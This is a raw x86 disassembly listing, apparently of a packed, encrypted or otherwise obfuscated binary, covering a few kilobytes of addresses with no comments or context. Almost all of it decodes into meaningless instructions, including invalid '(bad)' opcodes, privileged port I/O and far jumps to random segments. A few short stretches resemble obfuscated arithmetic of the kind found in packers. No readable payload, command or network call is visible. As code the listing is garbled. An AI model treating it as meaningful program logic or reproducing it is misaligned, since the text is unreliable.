  40e812:	sub    bh,BYTE PTR [ebx-0x55]
  40e815:	lahf   
  40e816:	sub    DWORD PTR [edx],ebx
  40e818:	test   DWORD PTR [edx],esi
  40e81a:	lea    ebp,[edi-0x61]
  40e81d:	cwde   
  40e81e:	xchg   esi,eax
  40e81f:	mov    bh,0x6d
  40e821:	push   cs
  40e822:	es not eax
  40e825:	add    ah,al
  40e827:	stc    
  40e828:	inc    eax
  40e829:	fcmovb st,st(2)
  40e82b:	addr16 push edi
  40e82d:	and    cl,BYTE PTR [edx-0x186900a0]
  40e833:	push   edi
  40e834:	xchg   esp,eax
  40e835:	or     edi,edx
  40e837:	fisttp QWORD PTR [edx]
  40e839:	jnp    0x40e892
  40e83b:	je     0x40e7d5
  40e83d:	int3   
  40e83e:	test   BYTE PTR [eax+ebx*4],dl
  40e841:	sbb    bh,BYTE PTR [esi]
  40e843:	mov    bl,BYTE PTR [edi]
  40e845:	gs popf 
  40e847:	mov    esp,0x4b816888
  40e84c:	sar    al,cl
  40e84e:	and    ecx,DWORD PTR [edx]
  40e850:	mov    ds:0x56f83d1d,al
  40e855:	jbe    0x40e8ac
  40e857:	mov    dh,BYTE PTR [esi-0x43]
  40e85a:	push   ds
  40e85b:	lea    ecx,[edx+ebx*8]
  40e85e:	test   al,0x7
  40e860:	lea    ecx,[edx-0x543598a2]
  40e866:	mov    cl,0x2
  40e868:	mov    ah,ah
  40e86a:	pop    edi
  40e86b:	je     0x40e815
  40e86d:	push   ebp
  40e86e:	and    di,WORD PTR [esi-0x34653a7d]
  40e875:	dec    ah
  40e877:	add    DWORD PTR [ebx+0x6908a97b],0xffffffc6
  40e87e:	and    BYTE PTR [esp+edi*2+0x3c45b8f0],cl
  40e885:	aad    0x3b
  40e887:	mov    gs,WORD PTR [ebx+0x40]
  40e88a:	ja     0x40e882
  40e88c:	mov    ch,0x60
  40e88e:	aad    0xfc
  40e890:	xchg   edi,eax
  40e891:	dec    ebp
  40e892:	jns    0x40e8e1
  40e894:	frstor [edx+0x88028df]
  40e89a:	(bad)  
  40e89b:	mov    ebx,0x6a308aa6
  40e8a0:	cmp    BYTE PTR [edx],ch
  40e8a2:	xchg   ebp,eax
  40e8a3:	call   0xd78e:0x3cabf267
  40e8aa:	mov    edx,0x79c3b183
  40e8af:	push   ss
  40e8b0:	out    0x74,al
  40e8b2:	adc    eax,0x1af3f052
  40e8b7:	mov    dh,0x88
  40e8b9:	mov    eax,0xbe51c214
  40e8be:	adc    dh,bl
  40e8c0:	loop   0x40e894
  40e8c2:	and    al,0xc6
  40e8c4:	mov    ah,0xc7
  40e8c6:	int3   
  40e8c7:	and    BYTE PTR [ebx+0x7300e5a7],dh
  40e8cd:	(bad)  
  40e8ce:	data16 lods al,BYTE PTR ds:[esi]
  40e8d0:	(bad)  
  40e8d1:	cld    
  40e8d2:	addr16 sbb eax,0xb10a7806
  40e8d8:	pop    es
  40e8d9:	retf   0x8cd5
  40e8dc:	ss jge 0x40e866
  40e8df:	cmp    DWORD PTR [ebp-0x51],ecx
  40e8e2:	jmp    0x40e934
  40e8e4:	push   ss
  40e8e5:	and    ch,dl
  40e8e7:	pop    esi
  40e8e8:	xchg   edi,eax
  40e8e9:	jp     0x40e927
  40e8eb:	xor    esp,ecx
  40e8ed:	mov    ebx,0xd7390231
  40e8f2:	and    DWORD PTR [ebp-0x40225924],0x819f9baf
  40e8fc:	(bad)  
  40e8fd:	xchg   ebx,eax
  40e8fe:	sub    eax,DWORD PTR cs:[ebx+0x0]
  40e902:	cmp    DWORD PTR [ebx-0x2d],0xffffff89
  40e906:	mov    ch,0xc3
  40e908:	mov    al,0xaf
  40e90a:	(bad)  
  40e90c:	mov    edi,0x4e2fcf6
  40e911:	adc    esp,DWORD PTR [edi-0x3d09a971]
  40e917:	dec    edx
  40e918:	rcr    BYTE PTR [ebp+0x23],cl
  40e91b:	and    dl,0x2c
  40e91e:	clc    
  40e91f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e920:	test   eax,0x2aa5a504
  40e925:	mov    bh,0x2b
  40e927:	xor    al,0xfa
  40e929:	mov    ecx,0x1a374545
  40e92e:	jge    0x40e99f
  40e930:	xor    DWORD PTR [ebp-0x4cc99d1],eax
  40e936:	fs dec edi
  40e938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e939:	call   DWORD PTR [ebp-0x5e74ce06]
  40e93f:	bswap  edi
  40e941:	xlat   BYTE PTR ds:[ebx]
  40e942:	mov    dl,0x1a
  40e944:	and    al,0xc1
  40e946:	js     0x40e933
  40e948:	dec    ebx
  40e949:	pop    esp
  40e94a:	adc    eax,0x334ae0b0
  40e94f:	imul   eax,DWORD PTR [esi+0x19],0xfe71152
  40e956:	jmp    0x3adc02b4
  40e95b:	mov    ds:0xbd460c80,eax
  40e960:	jbe    0x40e979
  40e962:	cmp    al,0x1a
  40e964:	xchg   ebp,eax
  40e965:	inc    BYTE PTR [ecx+0x1c]
  40e968:	scas   al,BYTE PTR es:[edi]
  40e969:	jno    0x40e91f
  40e96b:	les    edx,FWORD PTR [ebp-0x51]
  40e96e:	sbb    DWORD PTR [eax-0x54bbc078],esp
  40e974:	arpl   cx,si
  40e976:	sti    
  40e977:	popf   
  40e978:	and    BYTE PTR [ebx+0x2a],ah
  40e97b:	mov    dh,BYTE PTR ds:0x9bcffbb1
  40e981:	cdq    
  40e982:	into   
  40e983:	test   BYTE PTR [edi-0x5e],dl
  40e986:	mul    BYTE PTR [edx+edx*8]
  40e989:	or     eax,DWORD PTR [ecx+0x6]
  40e98c:	push   edi
  40e98d:	out    dx,eax
  40e98e:	call   0xfac03007
  40e993:	rcl    esi,0x24
  40e996:	xor    al,dl
  40e998:	fild   WORD PTR [edx+0x33]
  40e99b:	mov    BYTE PTR [edx],0x1a
  40e99e:	inc    esp
  40e99f:	sbb    eax,0xb235d2a6
  40e9a4:	cmc    
  40e9a5:	outs   dx,BYTE PTR ds:[esi]
  40e9a6:	sbb    al,0x77
  40e9a8:	ror    BYTE PTR [ecx-0x161b0f87],1
  40e9ae:	sub    cl,ah
  40e9b0:	in     al,dx
  40e9b1:	cmp    BYTE PTR [ebx],al
  40e9b3:	fwait
  40e9b4:	test   BYTE PTR [ecx],ch
  40e9b6:	addr16 mov cl,0x6
  40e9b9:	push   ebp
  40e9ba:	data16 add bh,cl
  40e9bd:	test   ebx,0x49530bd8
  40e9c3:	scas   eax,DWORD PTR es:[edi]
  40e9c4:	xor    DWORD PTR [ebx-0x6c],esp
  40e9c7:	je     0x40e964
  40e9c9:	arpl   WORD PTR [ecx+0x79],di
  40e9cc:	pop    eax
  40e9cd:	jb     0x40ea3b
  40e9cf:	mov    WORD PTR [ecx+0xc],es
  40e9d2:	bound  ebp,QWORD PTR [eax]
  40e9d4:	pusha  
  40e9d5:	test   BYTE PTR [ecx],0x7c
  40e9d8:	ror    BYTE PTR [ebp+eiz*1-0x498d4297],cl
  40e9df:	lods   al,BYTE PTR ds:[esi]
  40e9e0:	push   0xbb96466c
  40e9e5:	and    DWORD PTR [esi+edi*4],0xd1ef9207
  40e9ec:	add    ch,ch
  40e9ee:	sub    esp,0xffffffa7
  40e9f1:	add    dl,BYTE PTR [ebp-0x63]
  40e9f4:	and    bh,BYTE PTR [ecx+0x1f]
  40e9f7:	jle    0x40e9a1
  40e9f9:	int3   
  40e9fa:	clc    
  40e9fb:	leave  
  40e9fc:	adc    cl,al
  40e9fe:	sub    ah,0xe7
  40ea01:	cmp    eax,0x69e47af1
  40ea06:	mov    ch,0x90
  40ea08:	push   ebp
  40ea09:	lock cs mov ch,0x60
  40ea0d:	jno    0x40e9a0
  40ea0f:	fimul  WORD PTR [ecx+ebp*4+0x34]
  40ea13:	sbb    DWORD PTR [eax-0x6a],ecx
  40ea16:	jle    0x40e9a1
  40ea18:	jp     0x40ea31
  40ea1a:	lods   al,BYTE PTR ds:[esi]
  40ea1b:	xchg   BYTE PTR [edx-0x73],dl
  40ea1e:	push   ds
  40ea1f:	icebp  
  40ea20:	jbe    0x40e9f8
  40ea22:	call   0x60e5ceb6
  40ea27:	js     0x40eaa3
  40ea29:	or     al,0x2e
  40ea2b:	sub    eax,0xd73f4eb1
  40ea30:	dec    esp
  40ea31:	ja     0x40ea99
  40ea33:	dec    ebx
  40ea34:	xor    eax,0xe6ffaf32
  40ea39:	das    
  40ea3a:	xchg   esp,eax
  40ea3b:	inc    ecx
  40ea3c:	push   0xd9059c6d
  40ea41:	fld    TBYTE PTR [ecx-0x51]
  40ea44:	pushf  
  40ea45:	ins    BYTE PTR es:[edi],dx
  40ea46:	cmc    
  40ea47:	or     al,bl
  40ea49:	stc    
  40ea4a:	and    BYTE PTR [ecx-0x1216f254],al
  40ea50:	pusha  
  40ea51:	(bad)  [edi+0x1c6c1d64]
  40ea57:	stos   DWORD PTR es:[edi],eax
  40ea58:	or     DWORD PTR [eax+0x36],ebx
  40ea5b:	adc    ch,BYTE PTR [esi]
  40ea5d:	cli    
  40ea5e:	inc    eax
  40ea5f:	stos   DWORD PTR es:[edi],eax
  40ea60:	stos   DWORD PTR es:[edi],eax
  40ea61:	out    0xa6,eax
  40ea63:	aaa    
  40ea64:	xor    al,0x6
  40ea66:	ja     0x40eab0
  40ea68:	push   ecx
  40ea69:	fcom   DWORD PTR [eax-0x4e]
  40ea6c:	xor    eax,0x69dd63e
  40ea71:	inc    BYTE PTR [edx+0x26]
  40ea74:	pop    ds
  40ea75:	les    eax,FWORD PTR [edi-0x7f]
  40ea78:	mov    dl,0x96
  40ea7a:	fcom   st(0)
  40ea7c:	repnz fbld TBYTE PTR [edx]
  40ea7f:	and    bh,bl
  40ea81:	or     dh,BYTE PTR [ebx+eax*8+0x5416d141]
  40ea88:	mov    eax,0x52619044
  40ea8d:	mov    eax,0xe4d9ea5f
  40ea92:	arpl   WORD PTR [ecx-0x78a043d2],ax
  40ea98:	leave  
  40ea99:	sbb    edx,edi
  40ea9b:	mov    edx,0xeae03b31
  40eaa0:	adc    esi,DWORD PTR [ecx-0x8082dcd]
  40eaa6:	mov    edx,DWORD PTR ds:0x422518
  40eaac:	mov    edx,DWORD PTR [edx+0x1d4]
  40eab2:	sub    edx,eax
  40eab4:	mov    eax,DWORD PTR [ebp+0x10]
  40eab7:	mov    al,BYTE PTR [esi+eax*1]
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0x2eaa14b9
  40eaf1:	sahf   
  40eaf2:	mov    ds:0x18b8fdbc,eax
  40eaf7:	sbb    dl,dl
  40eaf9:	adc    al,0x18
  40eafb:	sbb    BYTE PTR [ecx],ch
  40eafd:	inc    edi
  40eafe:	dec    eax
  40eaff:	loope  0x40eab2
  40eb01:	dec    edi
  40eb02:	jg     0x40eaa2
  40eb04:	mov    bl,0x99
  40eb06:	in     eax,0xdc
  40eb08:	dec    eax
  40eb09:	sub    bl,BYTE PTR [esi]
  40eb0b:	out    0xf5,eax
  40eb0d:	mov    WORD PTR [ebx],fs
  40eb0f:	test   al,0x7c
  40eb11:	gs jne 0x40eb18
  40eb14:	test   al,0xb8
  40eb16:	lahf   
  40eb17:	or     dl,dh
  40eb19:	pop    ds
  40eb1a:	dec    ecx
  40eb1b:	fwait
  40eb1c:	mov    eax,gs
  40eb1e:	push   esi
  40eb1f:	imul   edx,DWORD PTR [ecx],0x24
  40eb22:	sahf   
  40eb23:	jecxz  0x40eab5
  40eb25:	(bad)  
  40eb26:	pop    ebx
  40eb27:	outs   dx,DWORD PTR ds:[esi]
  40eb28:	call   0x891d:0x7b213fa0
  40eb2f:	fisttp QWORD PTR [ebx]
  40eb31:	test   eax,0xe6301f4a
  40eb36:	inc    edx
  40eb37:	xor    edi,DWORD PTR [eax-0x496cc094]
  40eb3d:	mov    al,0x23
  40eb3f:	test   al,0xb9
  40eb41:	lahf   
  40eb42:	pop    esi
  40eb43:	sar    BYTE PTR [edx+0x453b6b88],1
  40eb49:	iret   
  40eb4a:	(bad)  
  40eb4b:	mov    ecx,0xf89ef938
  40eb50:	push   0x1c6d595d
  40eb55:	sub    al,0x9c
  40eb57:	push   ebp
  40eb58:	cmp    dl,BYTE PTR [ecx+0x6]
  40eb5b:	sar    DWORD PTR [ecx],cl
  40eb5d:	mov    ah,0xe
  40eb5f:	call   0x2bc5:0x32e5005
  40eb66:	sub    al,0x79
  40eb68:	sbb    DWORD PTR [esi-0x10],eax
  40eb6b:	mov    esi,0x309644a5
  40eb70:	cmc    
  40eb71:	jmp    FWORD PTR [ebp+eiz*8+0x71215b5d]
  40eb78:	jne    0x40ebdf
  40eb7a:	inc    ecx
  40eb7b:	fs mov ebx,0x1d8840be
  40eb81:	loope  0x40eb5a
  40eb83:	push   es
  40eb84:	push   0xffffffcf
  40eb86:	sub    BYTE PTR [esi+0x7a],bh
  40eb89:	loopne 0x40ebd7
  40eb8b:	icebp  
  40eb8c:	arpl   WORD PTR [edx-0x187f101e],si
  40eb92:	xchg   edx,eax
  40eb93:	pop    es
  40eb94:	pop    edi
  40eb95:	in     eax,0xe2
  40eb97:	dec    ebp
  40eb98:	xor    DWORD PTR [ecx],0x3c
  40eb9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb9c:	mov    esi,0x757f7ad1
  40eba1:	pop    es
  40eba2:	push   ebp
  40eba3:	add    eax,0x736cc4e
  40eba8:	and    dl,BYTE PTR [eax+eax*4+0x68]
  40ebac:	xor    DWORD PTR [edx],ebx
  40ebae:	nop
  40ebaf:	repnz cmp edx,DWORD PTR [edx+0x5a]
  40ebb3:	add    BYTE PTR [ebx+0x56],bl
  40ebb6:	or     edi,DWORD PTR [ecx+0x2311b369]
  40ebbc:	jmp    0x72b6127
  40ebc1:	adc    BYTE PTR [ecx-0x504d1df4],dh
  40ebc7:	and    esp,DWORD PTR [ebp+0x52]
  40ebca:	mov    esi,0x6c220573
  40ebcf:	(bad)  [eax+edi*4]
  40ebd2:	mov    eax,ds:0x9a658881
  40ebd7:	sbb    al,bh
  40ebd9:	mov    edi,0xac713959
  40ebde:	sahf   
  40ebdf:	adc    al,0x28
  40ebe1:	add    BYTE PTR [eax-0x34],ch
  40ebe4:	xor    DWORD PTR ds:0xf0f209f6,0xf
  40ebeb:	cdq    
  40ebec:	inc    esp
  40ebee:	scas   eax,DWORD PTR es:[edi]
  40ebef:	mov    edi,0x19dfdb3a
  40ebf4:	je     0x40ec5d
  40ebf6:	xchg   ebp,eax
  40ebf7:	(bad)  
  40ebf8:	test   BYTE PTR [ebx+ecx*2+0x5647bdc7],0xa7
  40ec00:	stos   BYTE PTR es:[edi],al
  40ec01:	mov    ebp,0x3dd4076f
  40ec07:	popa   
  40ec08:	jl     0x40ec16
  40ec0a:	mov    ds:0x6a9c92a7,al
  40ec0f:	(bad)  
  40ec10:	scas   eax,DWORD PTR es:[edi]
  40ec11:	xor    BYTE PTR [edx+0x18385922],dh
  40ec17:	xchg   edx,eax
  40ec18:	test   al,0x21
  40ec1a:	jae    0x40ec56
  40ec1c:	call   0x79e:0x78070263
  40ec23:	pushf  
  40ec24:	add    edx,esp
  40ec26:	xchg   DWORD PTR [ecx+0x6e0acdac],eax
  40ec2c:	dec    esi
  40ec2d:	or     ah,0x59
  40ec30:	lds    ebp,FWORD PTR [esi]
  40ec32:	minps  xmm6,XMMWORD PTR [edi+eax*4-0x26]
  40ec37:	adc    al,0xf9
  40ec39:	jl     0x40ec4b
  40ec3b:	inc    edi
  40ec3c:	imul   DWORD PTR [ecx-0x3c3dbb20]
  40ec42:	xor    bh,BYTE PTR [eax]
  40ec44:	(bad)  [ecx]
  40ec46:	fnstenv [ecx-0x297a5d90]
  40ec4c:	btc    DWORD PTR [eax-0x7161d40e],ebp
  40ec53:	inc    ebp
  40ec54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec55:	mov    ebx,0xd5231146
  40ec5a:	push   ss
  40ec5b:	jae    0x40ecb8
  40ec5d:	adc    edi,DWORD PTR [ebx]
  40ec5f:	dec    esp
  40ec60:	mov    dh,0x85
  40ec62:	loop   0x40ebf9
  40ec64:	(bad)
  40ec69:	out    dx,al
  40ec6a:	fld    DWORD PTR [ebp-0x5f]
  40ec6d:	cli    
  40ec6e:	daa    
  40ec6f:	js     0x40ec28
  40ec71:	es inc ebx
  40ec73:	and    DWORD PTR [ecx],edx
  40ec75:	cmp    ebp,DWORD PTR [esi-0x332d3feb]
  40ec7b:	push   0x513df4bf
  40ec80:	xor    DWORD PTR [edi],edi
  40ec82:	mov    BYTE PTR [ebx-0x66],bh
  40ec85:	dec    BYTE PTR [ebp+0x4b1c3836]
  40ec8b:	aaa    
  40ec8c:	pop    ebp
  40ec8d:	fiadd  WORD PTR [edi+0x3f]
  40ec90:	jle    0x40ec65
  40ec92:	(bad)  
  40ec93:	sbb    dh,BYTE PTR [ebp-0x6f]
  40ec96:	add    edi,DWORD PTR [ebx-0x40]
  40ec99:	mov    esp,0xe6dbbdbd
  40ec9e:	push   edx
  40ec9f:	fimul  WORD PTR [ecx-0x4f]
  40eca2:	sbb    al,bl
  40eca4:	outs   dx,BYTE PTR ds:[esi]
  40eca5:	or     DWORD PTR [ebp+0x7b],eax
  40eca8:	into   
  40eca9:	or     al,0x5b
  40ecab:	mov    ds:0x7a95fa84,al
  40ecb0:	out    0xd0,al
  40ecb2:	sub    DWORD PTR [ecx+0x2a3807ae],edx
  40ecb8:	xchg   edi,eax
  40ecb9:	mov    ch,0x46
  40ecbb:	push   edx
  40ecbc:	push   ecx
  40ecbd:	push   0xffffff8f
  40ecbf:	adc    BYTE PTR [ecx-0x63357188],bh
  40ecc5:	mov    ebx,DWORD PTR [edx]
  40ecc7:	sbb    ebx,0x1f
  40ecca:	(bad)  
  40eccc:	sbb    BYTE PTR [edi-0x48],dh
  40eccf:	in     eax,dx
  40ecd0:	cmp    eax,0x35a8f665
  40ecd5:	pop    ss
  40ecd6:	dec    eax
  40ecd7:	fcmovnbe st,st(6)
  40ecd9:	xor    DWORD PTR [esi],edx
  40ecdb:	imul   edi,esi,0xc144411b
  40ece1:	test   DWORD PTR [edx-0x3a],esp
  40ece4:	scas   eax,DWORD PTR es:[edi]
  40ece5:	cmp    BYTE PTR es:[ebp+0x240c9e97],ch
  40ecec:	mov    eax,0x4ae7d277
  40ecf1:	mov    dh,0x20
  40ecf3:	pop    ds
  40ecf4:	(bad)  
  40ecf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecf6:	mov    ebp,0x9eb77f01
  40ecfb:	aam    0xaa
  40ecfd:	test   DWORD PTR [esp+ecx*2-0x4bff61c1],edi
  40ed04:	ret    0x64df
  40ed07:	aaa    
  40ed08:	enter  0xc2b1,0xd2
  40ed0c:	xor    bh,BYTE PTR [ecx+0x5b]
  40ed0f:	es (bad) 
  40ed11:	push   ebx
  40ed12:	les    edx,FWORD PTR [ecx+0x9e5a53c]
  40ed18:	leave  
  40ed19:	iret   
  40ed1a:	jmp    0x40eced
  40ed1c:	les    esi,FWORD PTR [esi+0x15]
  40ed1f:	std    
  40ed20:	pop    ds
  40ed21:	(bad)  
  40ed22:	pop    edi
  40ed23:	and    ecx,ebx
  40ed25:	add    edi,DWORD PTR [edx]
  40ed27:	inc    esp
  40ed28:	fist   WORD PTR [ebx-0xdbe5a6c]
  40ed2e:	dec    ecx
  40ed2f:	xchg   ecx,eax
  40ed30:	(bad)  
  40ed31:	jb     0x40ed8d
  40ed33:	out    dx,eax
  40ed34:	test   BYTE PTR [edx-0x62ba7c94],dl
  40ed3a:	retf   
  40ed3b:	imul   ebx,DWORD PTR [edx+eax*4],0x5909f740
  40ed42:	or     eax,0xe5cf4b48
  40ed47:	arpl   WORD PTR [edi],si
  40ed49:	inc    esi
  40ed4a:	mov    ebx,0x652dc294
  40ed4f:	loopne 0x40ed73
  40ed51:	loope  0x40ed45
  40ed53:	mov    ch,0xdf
  40ed55:	push   cs
  40ed56:	loop   0x40edaf
  40ed58:	ret    
  40ed59:	add    dh,BYTE PTR [edi-0x471b5f48]
  40ed5f:	imul   esp,DWORD PTR [edi-0x2031fd6d],0xc5449646
  40ed69:	cmp    eax,0x50194608
  40ed6e:	mov    ecx,0x7c29e56
  40ed73:	icebp  
  40ed74:	and    DWORD PTR [eax+0x28ccaf2c],esi
  40ed7a:	repnz xchg edx,eax
  40ed7c:	cmp    al,0x9
  40ed7e:	add    BYTE PTR [ecx],0xa2
  40ed81:	fwait
  40ed82:	sar    DWORD PTR [esi+0x1b3d9507],cl
  40ed88:	fnstsw WORD PTR [esi-0x7b]
  40ed8b:	inc    esi
  40ed8c:	je     0x40edd8
  40ed8e:	iret   
  40ed8f:	imul   ebp,DWORD PTR [edi-0x6c],0xfeeb29d3
  40ed96:	out    dx,eax
  40ed97:	fistp  WORD PTR [esi-0x67af2499]
  40ed9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed9e:	mov    edi,DWORD PTR [ebx-0x725c546b]
  40eda4:	mov    WORD PTR [ecx],es
  40eda6:	out    0x59,al
  40eda8:	add    eax,0xf4458b35
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0x1aaa1270]
  40edd3:	cdq    
  40edd4:	adc    al,0xaa
  40edd6:	mov    bh,0xb2
  40edd8:	sbb    BYTE PTR [eax],bl
  40edda:	rcl    BYTE PTR [eax+ebx*1],cl
  40eddd:	sbb    BYTE PTR [ecx-0x22],bh
  40ede0:	cli    
  40ede1:	sub    DWORD PTR [ecx],esp
  40ede3:	lahf   
  40ede4:	push   edi
  40ede5:	cmp    DWORD PTR [ebp+0x4995e200],esi
  40edeb:	jmp    0x2df1:0xd73233a8
  40edf2:	push   0x4bbcb7f9
  40edf7:	mov    bh,0xb
  40edf9:	jmp    0x9712:0x94b0e194
  40ee00:	fistp  WORD PTR [edi+ebx*1-0x1942dd10]
  40ee07:	(bad)  
  40ee09:	rcr    ebp,1
  40ee0b:	clc    
  40ee0c:	cwde   
  40ee0d:	add    DWORD PTR [esi+ebp*1+0x0],0xffffff8b
  40ee12:	mov    edx,DWORD PTR [edi]
  40ee14:	js     0x40edae
  40ee16:	imul   esp,DWORD PTR [ebx+0x5d355fdf],0x41
  40ee1d:	ins    DWORD PTR es:[edi],dx
  40ee1e:	cmc    
  40ee1f:	push   eax
  40ee20:	jl     0x40ee76
  40ee22:	das    
  40ee23:	mov    ecx,0x508473f5
  40ee28:	or     eax,0xccf3c5db
  40ee2d:	sub    eax,0xbdc1188
  40ee32:	(bad)  
  40ee33:	push   ebx
  40ee34:	aam    0x57
  40ee36:	jmp    0x6130:0x6cbe071f
  40ee3d:	daa    
  40ee3e:	inc    eax
  40ee3f:	cmp    eax,0x6a70a0a6
  40ee44:	stc    
  40ee45:	sti    
  40ee46:	xor    DWORD PTR [ecx-0x24d2bf02],0xffffffaa
  40ee4d:	dec    esp
  40ee4e:	data16 fadd QWORD PTR [edi]
  40ee51:	pop    ebx
  40ee52:	mov    ch,0x93
  40ee54:	xchg   BYTE PTR [ebx-0x66],bh
  40ee57:	cdq    
  40ee58:	jp     0x40ee4a
  40ee5a:	pop    ecx
  40ee5b:	pusha  
  40ee5c:	adc    eax,0x30cfd8e2
  40ee61:	xor    DWORD PTR ds:0xe4f94eda,0xce3431d6
  40ee6b:	shr    BYTE PTR [ebx-0x4f1f7935],0x3
  40ee72:	out    0xc9,al
  40ee74:	or     al,0x68
  40ee76:	or     ecx,ebx
  40ee78:	jmp    0x40ee8a
  40ee7a:	pop    edi
  40ee7b:	pop    ss
  40ee7c:	arpl   WORD PTR [edx*4+0x3971e7a1],bp
  40ee83:	out    dx,eax
  40ee84:	inc    bl
  40ee86:	push   cs
  40ee87:	or     dl,BYTE PTR [edx+0x1c]
  40ee8a:	fsin   
  40ee8c:	mov    BYTE PTR [eax+0x1aacdf61],ch
  40ee92:	or     al,BYTE PTR [ebx+0x44b250fe]
  40ee98:	xlat   BYTE PTR ds:[ebx]
  40ee99:	jge    0x40ee3e
  40ee9b:	pop    es
  40ee9c:	adc    edx,DWORD PTR [esi]
  40ee9e:	aaa    
  40ee9f:	mov    WORD PTR [edi],fs
  40eea1:	stos   BYTE PTR es:[edi],al
  40eea2:	dec    edi
  40eea3:	mov    cl,0xea
  40eea5:	xchg   esi,eax
  40eea6:	scas   al,BYTE PTR es:[edi]
  40eea7:	xchg   esp,eax
  40eea8:	push   eax
  40eea9:	xchg   edi,eax
  40eeaa:	pop    edi
  40eeab:	and    al,0x6c
  40eead:	lahf   
  40eeae:	push   0x7b8be69e
  40eeb3:	shr    DWORD PTR fs:[esi],cl
  40eeb6:	and    BYTE PTR [edx-0x10],al
  40eeb9:	mov    esp,0x43946dec
  40eebe:	mov    ds:0xf29917b8,al
  40eec3:	xchg   ebx,eax
  40eec4:	std    
  40eec5:	mov    edx,0xf7af9876
  40eeca:	sub    DWORD PTR [eax],edx
  40eecc:	in     eax,0x68
  40eece:	sub    dl,BYTE PTR [ecx+edi*2]
  40eed1:	(bad)  
  40eed2:	dec    dh
  40eed4:	or     dh,al
  40eed6:	cmp    dl,BYTE PTR [ebx-0x52]
  40eed9:	sub    esp,edx
  40eedb:	xor    DWORD PTR [esi],edx
  40eedd:	fadd   DWORD PTR [ecx-0x2c118004]
  40eee3:	in     al,dx
  40eee4:	dec    edx
  40eee5:	jmp    0xbc61:0xe0ba383
  40eeec:	or     cl,al
  40eeee:	imul   DWORD PTR [eax-0x6c]
  40eef1:	out    dx,eax
  40eef2:	adc    al,BYTE PTR [esi-0x53]
  40eef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eef6:	sub    BYTE PTR [edx+0x48],dh
  40eef9:	push   edx
  40eefa:	je     0x40ee86
  40eefc:	cmc    
  40eefd:	cmp    cl,BYTE PTR ds:0xb570e4f6
  40ef03:	call   0xf937:0xae178dc2
  40ef0a:	bound  eax,QWORD PTR [eax-0x6eefbece]
  40ef10:	xor    ch,BYTE PTR [edx+0x311dbb17]
  40ef16:	push   ds
  40ef17:	fs mov cl,0x9c
  40ef1a:	mov    al,ds:0x2ca419
  40ef1f:	xchg   ebp,eax
  40ef20:	inc    eax
  40ef21:	nop
  40ef22:	repnz dec eax
  40ef24:	data16 aas 
  40ef26:	shl    DWORD PTR [edx-0x28],0xed
  40ef2a:	sbb    DWORD PTR [eax-0x1a],0x4e
  40ef2e:	xlat   BYTE PTR ds:[ebx]
  40ef2f:	dec    ecx
  40ef30:	inc    edx
  40ef31:	iret   
  40ef32:	mov    ds:0x3c1feda9,eax
  40ef37:	cmp    cl,al
  40ef39:	xchg   edx,eax
  40ef3a:	xchg   ebx,eax
  40ef3b:	pop    esp
  40ef3c:	and    al,0xe1
  40ef3e:	mov    ecx,0x6bf751ba
  40ef43:	pop    ebp
  40ef44:	fiadd  DWORD PTR [eax-0x1b]
  40ef47:	sar    BYTE PTR [ecx+0x4e],cl
  40ef4a:	adc    edx,edx
  40ef4c:	rcl    BYTE PTR [eax-0xc],0x90
  40ef50:	mov    bh,0x9b
  40ef52:	mov    ebp,0xb20d877a
  40ef57:	shl    BYTE PTR [edi-0x29],cl
  40ef5a:	sbb    edi,DWORD PTR [ebx-0x51]
  40ef5d:	scas   al,BYTE PTR es:[edi]
  40ef5e:	jne    0x40ef6a
  40ef60:	popa   
  40ef61:	aas    
  40ef62:	sbb    cl,BYTE PTR [eax-0x68]
  40ef65:	retf   0x12f
  40ef68:	or     al,0x35
  40ef6a:	fisub  DWORD PTR [esi-0x38]
  40ef6d:	mov    bh,0x67
  40ef6f:	dec    edi
  40ef70:	out    0x8f,al
  40ef72:	out    0x8d,al
  40ef74:	jle    0x40ef7b
  40ef76:	mov    ebp,0x813bb4da
  40ef7b:	ja     0x40ef49
  40ef7d:	lods   eax,DWORD PTR ds:[esi]
  40ef7e:	into   
  40ef7f:	int    0x8b
  40ef81:	push   cs
  40ef82:	xor    eax,0xa883b8a6
  40ef87:	jl     0x40efc2
  40ef89:	cmp    BYTE PTR [esi+0x6d5ac6bc],dl
  40ef8f:	xchg   esi,eax
  40ef90:	lods   eax,DWORD PTR ds:[esi]
  40ef91:	jmp    DWORD PTR [edi-0x4221acb4]
  40ef97:	jp     0x40ef60
  40ef99:	push   0xe89f815f
  40ef9e:	xor    eax,0x945cbbfe
  40efa3:	xor    DWORD PTR [edx-0x2a],eax
  40efa6:	xchg   edi,eax
  40efa7:	ror    BYTE PTR [eax-0x21],0x9e
  40efab:	retf   
  40efac:	xchg   ecx,eax
  40efad:	retf   0xfed
  40efb0:	retf   0x853a
  40efb3:	add    DWORD PTR [eax-0x1e],ebx
  40efb6:	pop    es
  40efb7:	loop   0x40f020
  40efb9:	daa    
  40efba:	jbe    0x40ef5f
  40efbc:	mov    ebp,0x99c0960d
  40efc1:	jmp    0xea760e0d
  40efc6:	clc    
